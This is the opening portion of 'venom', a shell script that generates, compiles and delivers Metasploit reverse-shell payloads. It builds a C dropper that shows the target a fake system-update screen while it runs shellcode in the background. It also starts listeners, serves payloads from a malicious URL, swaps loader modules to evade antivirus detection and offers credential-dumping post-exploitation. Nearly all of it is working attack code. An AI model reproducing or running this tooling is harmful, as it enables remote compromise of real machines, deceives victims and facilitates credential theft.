#!/bin/sh
# --------------------------------------------------------------
# venom - metasploit Shellcode generator/compiler/listenner
# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.16
# Suspicious-Shell-Activity (SSA) RedTeam develop @2017 - 2019
# codename: aconitum_nappelus [ GPL licensed ]
# --------------------------------------------------------------
# [DEPENDENCIES]
# "venom.sh will download/install all dependencies as they are needed"
# Zenity | Metasploit | GCC (unix) |  Pyinstaller (python-to-exe module)
# mingw32 (compile .EXE executables) | pyherion.py (crypter)
# PEScrambler.exe (PE obfuscator/scrambler) | apache2 webserver
# vbs-obfuscator | encrypt_PolarSSL | ettercap (dns_spoof) | WINE
# --------------------------------------------------------------
# Resize terminal windows size befor running the tool (gnome terminal)
# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
resize -s 40 105 > /dev/null




# --------------------
# check if user is root
# ---------------------
if [ $(id -u) != "0" ]; then
  echo "[x] we need to be root to run this script..."
  echo "[x] execute [ sudo ./venom.sh ] on terminal"
  exit
fi


# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}


Colors;
# ----------------------
# variable declarations
# ----------------------
OS=`uname` # grab OS
H0m3=`echo ~` # grab home path
ver="1.0.16" # script version display
C0d3="aconitum_nappelus" # version codename display
user=`who | awk {'print $1'}` # grab username
# user=`who | cut -d' ' -f1 | sort | uniq` # grab username
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
IPATH=`pwd` # grab venom.sh install path (home/username/shell)
# ------------------------------------------------------------------------
# funtions [templates] to be injected with shellcode
# ------------------------------------------------------------------------
Ch4Rs="$IPATH/output/chars.raw" # shellcode raw output path
InJEc="$IPATH/templates/exec.c" # exec script path
InJEc2="$IPATH/templates/exec.py" # exec script path
InJEc3="$IPATH/templates/exec_bin.c" # exec script path
InJEc4="$IPATH/templates/exec.rb" # exec script path
InJEc5="$IPATH/templates/exec_dll.c" # exec script path
InJEc6="$IPATH/templates/hta_attack/exec.hta" # exec script path
InJEc7="$IPATH/templates/hta_attack/index.html" # hta index path
InJEc8="$IPATH/templates/InvokePS1.bat" # invoke-shellcode script path
InJEc9="$IPATH/templates/exec0.py" # exec script path
InJEc10="$IPATH/templates/InvokeMeter.bat" # exec script path
InJEc11="$IPATH/templates/exec.php" # php script path
# phishing webpages to trigger RCE or downloads
InJEc12="$IPATH/templates/phishing/mega.html" # fake webpage script path
InJEc13="$IPATH/templates/phishing/driveBy.html" # fake webpage script path
InJEc14="$IPATH/templates/hta_attack/index.html" # fake webpage script path
InJEc15="$IPATH/templates/exec_psh.c" # c script path
InJEc16="$IPATH/templates/exec.jar" # jar script path


# -------------------------------------------
# SETTINGS FILE FUNTION (venom-main/settings)
# -------------------------------------------
ChEk=`cat settings | egrep -m 1 "MSF_REBUILD" | cut -d '=' -f2` > /dev/null 2>&1
MsFu=`cat settings | egrep -m 1 "MSF_UPDATE" | cut -d '=' -f2` > /dev/null 2>&1
ApAcHe=`cat settings | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null 2>&1
D0M4IN=`cat settings | egrep -m 1 "MEGAUPLOAD_DOMAIN" | cut -d '=' -f2` > /dev/null 2>&1
DrIvC=`cat settings | egrep -m 1 "WINE_DRIVEC" | cut -d '=' -f2` > /dev/null 2>&1
MsFlF=`cat settings | egrep -m 1 "MSF_LOGFILES" | cut -d '=' -f2` > /dev/null 2>&1
PyIn=`cat settings | egrep -m 1 "PYTHON_VERSION" | cut -d '=' -f2` > /dev/null 2>&1
PiWiN=`cat settings | egrep -m 1 "PYINSTALLER_VERSION" | cut -d '=' -f2` > /dev/null 2>&1
pHanTom=`cat settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
ArCh=`cat settings | egrep -m 1 "SYSTEM_ARCH" | cut -d '=' -f2` > /dev/null 2>&1
UUID_RANDOM_LENGTH="70" # build 23 uses random keys (comments) to evade signature detection (default 70)
EnV=`hostnamectl | grep Chassis | awk {'print $2'}` > /dev/null 2>&1


# --------------------------------------------
# Config user system correct arch (wine+mingw)
# --------------------------------------------
if [ "$ArCh" = "x86" ]; then
  arch="wine"
  ComP="i586-mingw32msvc-gcc"
elif [ "$ArCh" = "x64" ]; then
  arch="wine64"
  ComP="i686-w64-mingw32-gcc"
else
  echo ${RedF}[x]${white} ERROR: Wrong value input: [ $ArCh ]: not accepted ..${Reset}
  echo ${RedF}[x]${white} Edit [ settings ] File and Set the var: SYSTEM_ARCH= ${Reset}
  sleep 3
  exit
fi


# -----------------------------------------
# msf postgresql database connection check?
# -----------------------------------------
if [ "$ChEk" = "ON" ]; then
echo ${BlueF}
cat << !
    ╔─────────────────────────────────────────────────╗
    |  postgresql metasploit database connection fix  |
    ╚─────────────────────────────────────────────────╝
!

  #
  # start msfconsole to check postgresql connection status
  #
  service postgresql start
  echo ${BlueF}[☠]${white} Checking msfdb connection status ..${Reset}
  ih=`msfconsole -q -x 'db_status; exit -y' | awk {'print $3'}`
  if [ "$ih" != "connected" ]; then
    echo ${RedF}[x]${white} postgresql selected, no connection ..${Reset}
    echo ${BlueF}[☠]${white} Please wait, rebuilding msf database ..${Reset}
    # rebuild msf database (database.yml)
    echo ""
    msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    echo ""
    echo ${BlueF}[✔]${white} postgresql connected to msf ..${Reset}
    sleep 2
  else
    echo ${BlueF}[✔]${white} postgresql connected to msf ..${Reset}
    sleep 2
  fi
fi


# -----------------------------------------------
# update metasploit database before running tool?
# -----------------------------------------------
if [ "$MsFu" = "ON" ]; then
echo ${BlueF}
cat << !
    ╔─────────────────────────────────────────────────╗
    | please wait fetching latest metasploit modules  |
    ╚─────────────────────────────────────────────────╝
!
  xterm -T " UPDATING MSF DATABASE " -geometry 110x23 -e "msfconsole -x 'msfupdate; exit -y' && sleep 2"
fi


# -----------------------------------------------
# venom framework configurated to store logfiles?
# -----------------------------------------------
if [ "$MsFlF" = "ON" ]; then
echo ${BlueF}
cat << !
    ╔─────────────────────────────────────────────────╗
    | venom framework configurated to store logfiles  |
    ╚─────────────────────────────────────────────────╝
!
sleep 2
fi


# ---------------------------------------------
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
# ---------------------------------------------
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Mint) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}' | cut -d ':' -f2`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 300`;;
  esac
clear


# ------------------------------------
# end of script internal settings and
# display credits befor running module
# ------------------------------------
#                  - CodeName: $C0d3 -
echo ${BlueF} && clear && cat << !
                              
               __    _ ______  ____   _  _____  ____    __  
              \  \  //|   ___||    \ | |/     \|    \  /  |
               \  \// |   ___||     \| ||     ||     \/   |
                \__/  |______||__/\____|\_____/|__/\__/|__|
!
echo "${RedF}    Shellcode_Generator${white}::${RedF}CodeName${white}::${RedF}$C0d3${white}::${RedF}SSA(redteam)2019${BlueF}"
echo "    ╔────────────────────────────────────────────────────────────────╗"
echo "    |  ${YellowF}The main goal of this tool its not to build 'FUD' payloads!${BlueF}   |"
echo "    |  ${YellowF}But to give to its users the first glance of how shellcode is${BlueF} |"
echo "    |  ${YellowF}build, embedded into one template (any language), obfuscated${BlueF}  |"
echo "    |  ${YellowF}(e.g pyherion.py) and compiled into one executable file.${BlueF}      |"
echo "    ╠────────────────────────────────────────────────────────────────╝"
echo "    | Author:r00t-3xp10it | Suspicious_Shell_Activity (red_team)"
echo "    ╘ VERSION:${YellowF}$ver ${BlueF}USER:${YellowF}$user ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0"${Reset}
echo "" && echo ""
sleep 1
echo ${BlueF}[☠]${white} Press [${GreenF} ENTER ${white}] to continue ..${Reset}
read op


# -----------------------------------------
# check dependencies (msfconsole + apache2)
# -----------------------------------------
imp=`which msfconsole`
if [ "$?" -eq "0" ]; then
echo "msfconsole found" > /dev/null 2>&1
else
echo ""
echo ${RedF}[x]${white} msfconsole -> not found!${Reset}
echo ${BlueF}[☠]${white} This script requires msfconsole to work!${Reset}
sleep 2
exit
fi

apc=`which apache2`
if [ "$?" -eq "0" ]; then
echo "apache2 found" > /dev/null 2>&1
else
echo ""
echo ${RedF}[x]${white} apache2 -> not found!${Reset}
echo ${BlueF}[☠]${white} This script requires apache2 to work!${Reset}
sleep 2
echo ""
echo ${BlueF}[☠]${white} Please run: cd aux && sudo ./setup.sh${Reset}
echo ${BlueF}[☠]${white} to install all missing dependencies...${Reset}
exit
fi


# --------------------------------------------
# start metasploit/postgresql/apache2 services
# --------------------------------------------
if [ "$DiStR0" = "Kali" ]; then
service postgresql start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi
clear


# -----------------------------------------------
# arno0x0x meterpreter loader random bytes stager
# -----------------------------------------------
Chts=`cat settings | egrep -m 1 "RANDOM_STAGER_BYTES" | cut -d '=' -f2` > /dev/null 2>&1
ArNo=`cat settings | egrep -m 1 "METERPRETER_STAGER" | cut -d '=' -f2` > /dev/null 2>&1
if [ "$Chts" = "ON" ]; then
  if [ -e "$IPATH/obfuscate/meterpreter_loader.rb" ]; then
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: active ..${Reset}
    sleep 2
  else
echo ${BlueF}
cat << !
    ╔─────────────────────────────────────────────────────────────────────╗
    |  arno0x0x meterpreter_loader random bytes stager av bypass technic  |
    |                              ---                                    |
    | This setting forces venom toolkit at startup to backup/replace the  |
    | msf meterpreter_loader.rb (x86) and is counter part (x64) adding an |
    | arbitrary number of random bytes at the beginning of the stage being|
    |sent back to the stager in an attempt to evade AV signature detection|
    ╚─────────────────────────────────────────────────────────────────────╝

!
sleep 2
    # backup msf modules
    echo ${BlueF}[☠]${white} Backup default msf modules ..${Reset}
    sleep 1
    echo "$ArNo/meterpreter_loader.rb"
    cp $ArNo/meterpreter_loader.rb $IPATH/obfuscate/meterpreter_loader.rb
    echo "$ArNo/x64/meterpreter_loader.rb"
    cp $ArNo/x64/meterpreter_loader.rb $IPATH/obfuscate/meterpreter_loader_64.rb
    # replace default modules
    echo ${BlueF}[☠]${white} Replace default modules by venom modules ..${Reset}
    sleep 1
    cp $IPATH/aux/msf/meterpreter_loader.rb $ArNo/meterpreter_loader.rb > /dev/null 2>&1
    cp $IPATH/aux/msf/meterpreter_loader_64.rb $ArNo/x64/meterpreter_loader.rb > /dev/null 2>&1
    # start postgresql + reload msfdb
    echo ${BlueF}[☠]${white} Rebuild/Reload msf database ..${Reset}
    sleep 1
    msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    msfconsole -q -x 'reload_all; exit -y' | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Reload metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: active ..${Reset}
    sleep 2
  fi
fi
clear


# ----------------------------------
# bash trap ctrl-c and call ctrl_c()
# ----------------------------------
trap ctrl_c INT
ctrl_c() {
echo "${RedF}[x]${white} CTRL+C PRESSED -> ABORTING TASKS!"${Reset}
sleep 1
echo ${BlueF}[☠]${white} Cleanning temp generated files...${Reset}
# just in case :D !!!
# revert [templates] backup files to default stages
mv $IPATH/templates/exec[bak].c $InJEc > /dev/null 2>&1
mv $IPATH/templates/exec[bak].py $InJEc2 > /dev/null 2>&1
mv $IPATH/templates/exec_bin[bak].c $InJEc3 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].rb $InJEc4 > /dev/null 2>&1
mv $IPATH/templates/exec_dll[bak].c $InJEc5 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/exec[bak].hta $InJEc6 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/index[bak].html $InJEc7 > /dev/null 2>&1
mv $IPATH/templates/InvokePS1[bak].bat $InJEc8 > /dev/null 2>&1
mv $IPATH/templates/exec0[bak].py $InJEc9 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /dev/null 2>&1
mv $IPATH/templates/evil_pdf/PDF-encoder[bak].py PDF-encoder.py > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
# delete temp generated files
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/templates/trigger.raw > /dev/null 2>&1
rm $IPATH/templates/obfuscated.raw > /dev/null 2>&1
rm $IPATH/templates/copy.c > /dev/null 2>&1
rm $IPATH/templates/copy2.c > /dev/null 2>&1
rm $IPATH/templates/final.c > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/output/sedding.raw > /dev/null 2>&1
rm $IPATH/output/payload.raw > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.raw > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.c > /dev/null 2>&1
rm $IPATH/bin/*.ps1 > /dev/null 2>&1
rm $IPATH/bin/*.vbs > /dev/null 2>&1
rm -r $H0m3/.psploit > /dev/null 2>&1
rm $IPATH/bin/sedding.raw > /dev/null 2>&1
rm $IPATH/obfuscate/final.vbs > /dev/null 2>&1
# delete temp files from apache webroot
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm $ApAcHe/trigger.sh > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/*.apk > /dev/null 2>&1
rm $ApAcHe/*.exe > /dev/null 2>&1
rm $ApAcHe/*.py > /dev/null 2>&1
rm $ApAcHe/*.bat > /dev/null 2>&1
rm $ApAcHe/*.deb > /dev/null 2>&1
# delete pyinstaller temp files
rm $IPATH/*.spec > /dev/null 2>&1
rm -r $IPATH/dist > /dev/null 2>&1
rm -r $IPATH/build > /dev/null 2>&1
# delete rtf files
rm /tmp/shell.exe > /dev/null 2>&1
rm $ApAcHe/shell.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
# icmp (ping) shell
if [ "$ICMPDIS" = "disabled" ]; then
   echo "${RedF}[x]${white} Local ICMP Replies are disable (enable ICMP replies)${white}"
   sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null 2>&1
fi
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
rm $ApAcHe/$N4m.bat > /dev/null 2>&1
rm $ApAcHe/icmpsh.exe > /dev/null 2>&1
# exit venom.sh
echo ${BlueF}[☠]${white} Exit Shellcode Generator...${Reset}
echo ${BlueF}[☠]${white} [_Codename:$C0d3]${Reset}
sleep 1
if [ "$DiStR0" = "Kali" ]; then
service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi
cd $IPATH
cd ..
sudo chown -hR $user shell > /dev/null 2>&1


# -----------------------
# arno0x0x av obfuscation
# ----------------------
if [ "$Chts" = "ON" ]; then
  if [ -e "$IPATH/obfuscate/meterpreter_loader.rb" ]; then
    # backup msf modules
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: revert ..${Reset}
    echo ${BlueF}[☠]${white} Revert default msf modules ..${Reset}
    sleep 1
    cp $IPATH/obfuscate/meterpreter_loader.rb $ArNo/meterpreter_loader.rb
    cp $IPATH/obfuscate/meterpreter_loader_64.rb $ArNo/x64/meterpreter_loader.rb
    rm $IPATH/obfuscate/meterpreter_loader.rb
    rm $IPATH/obfuscate/meterpreter_loader_64.rb
    # reload msfdb
    echo ${BlueF}[☠]${white} Rebuild/Reload msf database ..${Reset}
    sleep 1
    msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    msfconsole -q -x 'reload_all; exit -y' | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Reload metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  else
    echo ${RedF}[x]${white} no backup msf modules found..${Reset}
    sleep 2
  fi
fi
exit
}



# -------------------------------------------------END OF SCRIPT SETTINGS------------------------------------->




# ---------------------------------------------
# build shellcode in C format
# targets: Apple | BSD | LINUX | SOLARIS
# ---------------------------------------------
sh_shellcode1 () {
# get user input to build shellcode
echo ${BlueF}[☠]${white} Enter shellcode settings!${Reset}
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "osx/x64/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "bsd/x64/shell_reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 460) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
echo ${BlueF}[☠]${white} editing/backup files...${Reset};

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="shellcode";fi


echo "${BlueF}[☠]${white} Building shellcode -> C format ..."${Reset};
sleep 2
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | NAME    : $N4m
    | FORMAT  : C -> UNIX
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c -o $IPATH/output/chars.raw"
echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo ""
sleep 2
# parsing shellcode data
cmd=$(cat $IPATH/output/chars.raw | grep -v "=")


   # check if all dependencies needed are installed
   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "${BlueF}[☠]${white} chars.raw -> found!"${Reset};
      sleep 2 
   else
      echo "${RedF}[x]${white} chars.raw -> not found!"${Reset};
      exit
   fi

   # check if gcc exists
   c0m=`which gcc`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "${BlueF}[☠]${white} gcc compiler -> found!"${Reset};
      sleep 2
   else
      echo "${RedF}[x]${white} gcc compiler -> not found!"${Reset};
      echo "${BlueF}[☠]${white} Download compiler -> apt-get install gcc"${Reset};
      echo ""
      sudo apt-get install gcc
      echo ""
   fi


## EDITING/BACKUP FILES NEEDED
cp $InJEc $IPATH/templates/exec[bak].c


# -----------------
# BUILD C TEMPLATE
# -----------------
echo "#include<stdio.h>" > $IPATH/output/exec.c
echo "#include<stdlib.h>" >> $IPATH/output/exec.c
echo "#include<string.h>" >> $IPATH/output/exec.c
echo "#include<sys/types.h>" >> $IPATH/output/exec.c
echo "#include<sys/wait.h>" >> $IPATH/output/exec.c
echo "#include<unistd.h>" >> $IPATH/output/exec.c
echo "" >> $IPATH/output/exec.c
echo "/*" >> $IPATH/output/exec.c
echo "Author: r00t-3xp10it" >> $IPATH/output/exec.c
echo "Framework: venom v1.0.16" >> $IPATH/output/exec.c
echo "gcc -fno-stack-protector -z execstack exec.c -o $N4m" >> $IPATH/output/exec.c
echo "*/" >> $IPATH/output/exec.c
echo "" >> $IPATH/output/exec.c
echo "/* msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c */" >> $IPATH/output/exec.c
echo "unsigned char kungfu[] =" >> $IPATH/output/exec.c
echo "$cmd" >> $IPATH/output/exec.c
echo "" >> $IPATH/output/exec.c
echo "int main()" >> $IPATH/output/exec.c
echo "{" >> $IPATH/output/exec.c
echo "/*" >> $IPATH/output/exec.c
echo "This fork(); function allow us to spawn a new child process (in background). This way i can" >> $IPATH/output/exec.c
echo "execute shellcode in background while continue the execution of the C program in foreground." >> $IPATH/output/exec.c
echo "Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c" >> $IPATH/output/exec.c
echo "*/" >> $IPATH/output/exec.c
echo "fflush(NULL);" >> $IPATH/output/exec.c
echo "int pid = fork();" >> $IPATH/output/exec.c
echo "   if (pid > 0) {" >> $IPATH/output/exec.c
echo "      /* We are running in parent process (as foreground job). */" >> $IPATH/output/exec.c
echo "      printf(\"Please Wait, Updating system ..\\\n\\\n\");" >> $IPATH/output/exec.c
echo "      /* Display system information onscreen to target user */" >> $IPATH/output/exec.c
echo "      sleep(1);system(\"h=\$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \\\"Hostname   :\$h\\\"\");" >> $IPATH/output/exec.c
echo "      system(\"k=\$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \\\"Kernel     :\$k\\\"\");" >> $IPATH/output/exec.c
echo "      system(\"b=\$(hostnamectl | grep 'Boot' | cut -d ':' -f2);echo \\\"Boot ID    :\$b\\\"\");" >> $IPATH/output/exec.c
echo "      sleep(2);printf(\"\\\n\");" >> $IPATH/output/exec.c
echo "      system(\"OP=\$(hostnamectl | grep 'Operating' | awk {'print \$3'});echo \\\"Hit:1 http://\$OP.download/\$OP \$OP-rolling/contrib\\\"\");" >> $IPATH/output/exec.c
echo "      printf(\"------------------------------------------------------\\\n\");" >> $IPATH/output/exec.c
echo "      sleep(1);system(\"for i in 1023.8353.9354:/daemon 7384.8400.8112:/etc/apt 3305.6720.2201:/etc/bin 6539.3167.1200:/etc/cron 4739.0473.4370:/etc/systemd 9164.0257.0034:/etc/passwd 1023.2559.0076:/etc/crontab 3945.4401.5037:/etc/fork.sys 4406.4490.2320:/etc/drive.sys 1288.3309.9955:/etc/PSmanager 1992.9909.1234:/etc/synaptic 4856.4845.6677:/etc/sources.list 4400.0079.0001:/etc/shadow;do dt=\$(date|awk {'print \$4,\$5,\$6'});echo \\\"\$dt - PATCHING: \$i\\\" && sleep 1;done\");" >> $IPATH/output/exec.c
echo "      printf(\"------------------------------------------------------\\\n\");" >> $IPATH/output/exec.c
echo "      printf(\"Please Wait, finishing update process ..\\\n\");" >> $IPATH/output/exec.c
echo "      sleep(2);printf(\"Done...\\\n\");" >> $IPATH/output/exec.c
echo "   }" >> $IPATH/output/exec.c
echo "   else if (pid == 0) {" >> $IPATH/output/exec.c
echo "      /* We are running in child process (as backgrond job - orphan). */" >> $IPATH/output/exec.c
echo "      setsid();" >> $IPATH/output/exec.c
echo "      void (*ret)() = (void(*)())kungfu;" >> $IPATH/output/exec.c
echo "      ret();" >> $IPATH/output/exec.c
echo "  } return 0;" >> $IPATH/output/exec.c
echo "}" >> $IPATH/output/exec.c


cd $IPATH/templates
# COMPILING SHELLCODE USING GCC
echo "${BlueF}[☠]${white} Compiling using gcc..."${Reset};
gcc -fno-stack-protector -z execstack $IPATH/output/exec.c -o $IPATH/output/$N4m


## CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nExecute: sudo ./$N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 305) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
      echo ${YellowF}[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
      echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
        if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log  
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2

   else

P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" FALSE "exploit_suggester.rc" --width 305 --height 260) > /dev/null 2>&1


if [ "$P0" = "dump_credentials_linux.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/wifi_dump_linux.rb" ]; then
    echo ${GreenF}[✔]${white} wifi_dump_linux.rb -> found${Reset};
    sleep 2
  else
    echo ${RedF}[x]${white} wifi_dump_linux.rb -> not found${Reset};
    sleep 1
    echo ${BlueF}[*]${white} copy post-module to msfdb ..${Reset};
    cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
    echo ${BlueF}[☠]${white} Reloading msfdb database ..${Reset};
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi

elif [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo ${GreenF}[✔]${white} linux_hostrecon.rb -> found${Reset};
    sleep 2
  else
    echo ${RedF}[x]${white} linux_hostrecon.rb -> not found${Reset};
    sleep 1
    echo ${BlueF}[*]${white} copy post-module to msfdb ..${Reset};
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
